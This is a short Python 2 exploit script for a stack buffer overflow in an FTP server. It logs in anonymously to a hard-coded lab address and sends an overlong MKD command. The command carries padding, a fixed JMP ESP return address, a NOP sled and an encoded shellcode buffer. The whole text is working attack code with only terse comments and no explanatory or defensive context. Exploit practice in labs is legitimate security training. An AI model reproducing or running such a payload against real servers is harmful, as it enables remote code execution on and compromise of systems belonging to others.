#!/usr/bin/python
 
import socket
import sys

buf =  ""
buf += "\xdb\xcf\xd9\x74\x24\xf4\xb8\x3e\xdc\xe3\xad\x5f\x29"
buf += "\xc9\xb1\x53\x31\x47\x17\x83\xc7\x04\x03\x79\xcf\x01"
buf += "\x58\x79\x07\x47\xa3\x81\xd8\x28\x2d\x64\xe9\x68\x49"
buf += "\xed\x5a\x59\x19\xa3\x56\x12\x4f\x57\xec\x56\x58\x58"
buf += "\x45\xdc\xbe\x57\x56\x4d\x82\xf6\xd4\x8c\xd7\xd8\xe5"
buf += "\x5e\x2a\x19\x21\x82\xc7\x4b\xfa\xc8\x7a\x7b\x8f\x85"
buf += "\x46\xf0\xc3\x08\xcf\xe5\x94\x2b\xfe\xb8\xaf\x75\x20"
buf += "\x3b\x63\x0e\x69\x23\x60\x2b\x23\xd8\x52\xc7\xb2\x08"
buf += "\xab\x28\x18\x75\x03\xdb\x60\xb2\xa4\x04\x17\xca\xd6"
buf += "\xb9\x20\x09\xa4\x65\xa4\x89\x0e\xed\x1e\x75\xae\x22"
buf += "\xf8\xfe\xbc\x8f\x8e\x58\xa1\x0e\x42\xd3\xdd\x9b\x65"
buf += "\x33\x54\xdf\x41\x97\x3c\xbb\xe8\x8e\x98\x6a\x14\xd0"
buf += "\x42\xd2\xb0\x9b\x6f\x07\xc9\xc6\xe7\xe4\xe0\xf8\xf7"
buf += "\x62\x72\x8b\xc5\x2d\x28\x03\x66\xa5\xf6\xd4\x89\x9c"
buf += "\x4f\x4a\x74\x1f\xb0\x43\xb3\x4b\xe0\xfb\x12\xf4\x6b"
buf += "\xfb\x9b\x21\x01\xf3\x3a\x9a\x34\xfe\xfd\x4a\xf9\x50"
buf += "\x96\x80\xf6\x8f\x86\xaa\xdc\xb8\x2f\x57\xdf\xd7\xf3"
buf += "\xde\x39\xbd\x1b\xb7\x92\x29\xde\xec\x2a\xce\x21\xc7"
buf += "\x02\x78\x69\x01\x94\x87\x6a\x07\xb2\x1f\xe1\x44\x06"
buf += "\x3e\xf6\x40\x2e\x57\x61\x1e\xbf\x1a\x13\x1f\xea\xcc"
buf += "\xb0\xb2\x71\x0c\xbe\xae\x2d\x5b\x97\x01\x24\x09\x05"
buf += "\x3b\x9e\x2f\xd4\xdd\xd9\xeb\x03\x1e\xe7\xf2\xc6\x1a"
buf += "\xc3\xe4\x1e\xa2\x4f\x50\xcf\xf5\x19\x0e\xa9\xaf\xeb"
buf += "\xf8\x63\x03\xa2\x6c\xf5\x6f\x75\xea\xfa\xa5\x03\x12"
buf += "\x4a\x10\x52\x2d\x63\xf4\x52\x56\x99\x64\x9c\x8d\x19"
buf += "\x94\xd7\x8f\x08\x3d\xbe\x5a\x09\x20\x41\xb1\x4e\x5d"
buf += "\xc2\x33\x2f\x9a\xda\x36\x2a\xe6\x5c\xab\x46\x77\x09"
buf += "\xcb\xf5\x78\x18"

#prepand the buffer with NOP slides
shellcode = "\x90"*20 + buf

#jmp ESP address 
payload = "A"*247 + "\x69\x2D\xB3\x7C" + shellcode + "C"*(749-len(shellcode))

# create a socket object to connect with the server 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.188.131',21))
 
# wait for the server to respond
s.recv(1024)
#send user name
s.send('USER anonymous\r\n')

# wait for the server to respond
s.recv(1024)
# send the password
s.send('PASS anonymous\r\n')

# wait for the server to respond
s.recv(1024)
#use the MKD command to fuzz the server
s.send('MKD ' + payload + '\r\n')

s.recv(1024)
s.send('QUIT\r\n')
s.close
